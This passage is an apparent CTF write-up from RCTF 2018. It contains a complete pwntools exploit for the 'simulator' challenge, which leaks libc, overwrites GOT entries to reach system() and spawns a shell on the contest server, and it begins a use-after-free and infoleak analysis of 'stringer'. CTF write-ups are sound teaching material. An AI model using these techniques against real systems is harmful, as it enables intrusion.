</span></span><span class=line><span class=cl>        <span class=n>chall</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>alpha</span> <span class=o>=</span> <span class=s1>&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>,</span><span class=n>c</span><span class=p>,</span><span class=n>d</span> <span class=ow>in</span> <span class=n>itertools</span><span class=o>.</span><span class=n>product</span><span class=p>(</span><span class=n>alpha</span><span class=p>,</span> <span class=n>repeat</span><span class=o>=</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=n>sha256</span><span class=p>(</span><span class=n>chall</span> <span class=o>+</span> <span class=n>a</span> <span class=o>+</span> <span class=n>b</span> <span class=o>+</span> <span class=n>c</span> <span class=o>+</span> <span class=n>d</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\0\0\0</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>==</span> <span class=kc>True</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>sol</span> <span class=o>=</span> <span class=n>a</span> <span class=o>+</span> <span class=n>b</span> <span class=o>+</span> <span class=n>c</span> <span class=o>+</span> <span class=n>d</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>sol</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>conn</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./simulator&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>div8</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>lines</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;li $v0, 0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;li $t0, 1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>reversed</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mi>32</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;li $t1, </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;slt $t2, $a0, $t1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;beq $t2, $t0, div8_</span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;sub $a0, $a0, $t1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;li $t1, </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=p>(</span><span class=n>i</span><span class=o>-</span><span class=mi>3</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;add $v0, $v0, $t1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;div8_</span><span class=si>{}</span><span class=s1>:&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>lines</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>STRCMP_LIBC_OFF</span> <span class=o>=</span> <span class=mh>0x13a6b0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>li $t0, 2155911681
</span></span></span><span class=line><span class=cl><span class=s2>lw $a0, $t0
</span></span></span><span class=line><span class=cl><span class=s2>sub $a0, $a0, </span><span class=si>{}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>li $v0, 1
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>sub $a0, $a0, 67108860
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>STRCMP_LIBC_OFF</span><span class=p>)</span> <span class=o>+</span> <span class=n>div8</span><span class=p>()</span> <span class=o>+</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>li $t0, 2147483648
</span></span></span><span class=line><span class=cl><span class=s2>add $t0, $v0, $t0
</span></span></span><span class=line><span class=cl><span class=s2>dump:
</span></span></span><span class=line><span class=cl><span class=s2>lw $a0, $t0
</span></span></span><span class=line><span class=cl><span class=s2>li $v0, 1
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>add $t0, $t0, 1
</span></span></span><span class=line><span class=cl><span class=s2>j dump
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Solving PoW&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Sending code&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;END&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Leaking libc&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>conn</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;0x</span><span class=si>{:08x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>libc</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Dumping libc&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;libc_dump&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>conn</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>            <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>4</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>val</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=p>(</span><span class=ne>EOFError</span><span class=p>,</span> <span class=ne>ValueError</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span></code></pre></div><p>We determined that the dump corresponded to libc <code>2.23-0ubuntu10</code> (32 bit), which we should have figured out earlier, as it&rsquo;s the 32 bit version of the same libc used in all the other pwnables&mldr; oh well.
Let&rsquo;s exploit this.
We decided to go with a GOT overwrite (through <code>sw</code>).
We noticed that there aren&rsquo;t calls to GOT functions with a controlled first argument (i.e., hijackable to <code>system</code>) after executing MIPS code.
However, the instruction reading loop, which happens before executing code, calls <code>strncmp</code> with user input as the first argument.
Since we can get a call to <code>puts</code> at the end of code execution to print <code>Unknown instruction</code>, we first overwrote the GOT entry for <code>strncmp</code> to <code>system</code>, and then overwrote the GOT entry for <code>puts</code> to <code>main</code>.
When calling <code>puts</code>, the simulator will restart and a line of input will be passed as first argument to <code>strncmp</code>, which is now <code>system</code>.
Now we can call <code>system("sh")</code> and pop a shell:</p><pre tabindex=0><code>$ cat flag
RCTF{5imu_s1mu_sinnu_siml_l_simulator!_7a3dac}
</code></pre><h3 class="relative group">Exploit code<div id=exploit-code-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#exploit-code-1 aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>itertools</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha256</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pow</span><span class=p>(</span><span class=n>todo</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>todo</span> <span class=o>==</span>  <span class=kc>True</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;simulator.2018.teamrois.cn&#34;</span><span class=p>,</span> <span class=mi>3131</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>chall</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>alpha</span> <span class=o>=</span> <span class=s1>&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>,</span><span class=n>c</span><span class=p>,</span><span class=n>d</span> <span class=ow>in</span> <span class=n>itertools</span><span class=o>.</span><span class=n>product</span><span class=p>(</span><span class=n>alpha</span><span class=p>,</span> <span class=n>repeat</span><span class=o>=</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=n>sha256</span><span class=p>(</span><span class=n>chall</span> <span class=o>+</span> <span class=n>a</span> <span class=o>+</span> <span class=n>b</span> <span class=o>+</span> <span class=n>c</span> <span class=o>+</span> <span class=n>d</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\0\0\0</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>==</span> <span class=kc>True</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>sol</span> <span class=o>=</span> <span class=n>a</span> <span class=o>+</span> <span class=n>b</span> <span class=o>+</span> <span class=n>c</span> <span class=o>+</span> <span class=n>d</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>sol</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>conn</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./simulator&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>STRCMP_LIBC_OFF</span> <span class=o>=</span> <span class=mh>0x1396b0</span>
</span></span><span class=line><span class=cl><span class=n>SYSTEM_OFF</span> <span class=o>=</span> <span class=mh>0x3a940</span>
</span></span><span class=line><span class=cl><span class=n>MAIN</span> <span class=o>=</span> <span class=mh>0x0804ac58</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># strncmp = system()</span>
</span></span><span class=line><span class=cl><span class=c1># puts = MAIN</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>li $t0, 2155911681
</span></span></span><span class=line><span class=cl><span class=s2>lw $t1, $t0
</span></span></span><span class=line><span class=cl><span class=s2>sub $t1, $t1, </span><span class=si>{}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>add $t1, $t1, </span><span class=si>{}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>li $t0, 2155911689
</span></span></span><span class=line><span class=cl><span class=s2>sw $t1, $t0
</span></span></span><span class=line><span class=cl><span class=s2>li $t0, 2155911684
</span></span></span><span class=line><span class=cl><span class=s2>li $t1, </span><span class=si>{}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>sw $t1, $t0
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>STRCMP_LIBC_OFF</span><span class=p>,</span> <span class=n>SYSTEM_OFF</span><span class=p>,</span> <span class=n>MAIN</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Solving PoW&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Sending code&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;END&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;Popping shell&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;sh&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h2 class="relative group">stringer<div id=stringer class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#stringer aria-label=Anchor>#</a></span></h2><h3 class="relative group">Overview<div id=overview-10 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#overview-10 aria-label=Anchor>#</a></span></h3><p>We&rsquo;re given a 64-bit Linux ELF and its libc (2.23).
Checksec shows full RELRO, canaries, NX and PIE.</p><p>During initialization, a randomly-sized chunk is allocated on the heap to shift the user allocations by a random offset.
Then, the program shows a basic menu:</p><pre tabindex=0><code>1. New string
2. Show string
3. Edit string
4. Delete string
5. Exit
</code></pre><p>Option 1 allows us to allocate a string.
It asks for a length (up to 256), then it <code>calloc</code>s that length and copies our input into it.
We can allocate up to 32 strings.
Option 2 just outputs <code>don't even think about it</code>.
Option 3 can be used to &ldquo;edit&rdquo; a string.
It asks for an offset inside of a string, and increments the byte at that offset.
We can do at most five increments per string.
Option 4 frees a string.</p><h3 class="relative group">Vulnerabilities<div id=vulnerabilities class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#vulnerabilities aria-label=Anchor>#</a></span></h3><p>The first thing we notice is an obvious use-after-free triggered by deleting a string:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>delete_string</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>idx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>str</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;please input the index: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=nf>read_int</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>idx</span> <span class=o>&gt;</span> <span class=mi>31</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;not a validate index&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>str</span> <span class=o>=</span> <span class=n>strings</span><span class=p>[</span><span class=n>idx</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;not a validate index&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>str</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Where <code>strings</code> is a global array of pointers to allocated strings.
Entries in this array are added by the new string option, and the edit string option considers an index valid if its entry is not NULL.
However, <code>delete_string</code> does not set the entry to NULL after freeing.
Therefore, we can edit a freed string, or free a string multiple times.</p><p>There&rsquo;s another, more subtle issue when adding a string.
This is the code for <code>new_string</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>new_string</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>str</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>num_strings</span> <span class=o>&gt;</span> <span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;too many string&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;please input string length: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>len</span> <span class=o>=</span> <span class=nf>read_int</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>len</span> <span class=o>||</span> <span class=n>len</span> <span class=o>&gt;</span> <span class=mi>256</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;invalid size&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>str</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=nf>calloc</span><span class=p>(</span><span class=n>len</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;memory error&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;please input the string content: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read_line</span><span class=p>(</span><span class=n>str</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>31</span> <span class=o>&amp;&amp;</span> <span class=n>strings</span><span class=p>[</span><span class=n>i</span><span class=p>];</span> <span class=o>++</span><span class=n>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>i</span> <span class=o>&gt;</span> <span class=mi>31</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;too many string&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>strings</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>str</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;your string: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>str</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>++</span><span class=n>num_strings</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>string_len</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>And this is the code for <code>read_line</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>read_line</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>size</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>c</span><span class=p>,</span> <span class=mi>1uLL</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nf>die</span><span class=p>(</span><span class=s>&#34;read() error&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>c</span> <span class=o>==</span> <span class=sc>&#39;\n&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>buf</span><span class=p>[</span><span class=n>size</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>It seems that the string creation could be used to leak memory.
Notice the behaviour of <code>read_line</code> when it encounters a newline: it stops reading, it doesn&rsquo;t replace the newline with a zero, and then zero-terminates the string <em>based on the buffer size</em>, not on the actual read length.
Then, <code>new_string</code> prints out the string <em>from the heap chunk</em> using <code>%s</code>, which stops at the zero terminator.
So, if we allocate a string on top of a free chunk that contains some data we want to leak (e.g., pointers), then send a short string (e.g., only a newline, so that we only overwrite one byte), we&rsquo;ll leak the data up to the first zero.
This sounds really nice, until you notice the string is <code>calloc</code>ed, so any data in the free chunk is destroyed.
However, as we&rsquo;ll see, there&rsquo;s a way around that&mldr;</p><h3 class="relative group">Breaking <code>calloc</code><div id=breaking-calloc class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#breaking-calloc aria-label=Anchor>#</a></span></h3><p>Apparently, we don&rsquo;t have any leaks.
I fiddled for a bit, trying to come up with a way to exploit this challenge using only the UAF on edit and delete, but I got nowhere.
So I went back to the almost-but-not-quite infoleak I described earlier, asking myself whether there are cases in which <code>calloc</code> doesn&rsquo;t clear the memory.
Mmapped chunks came to mind.
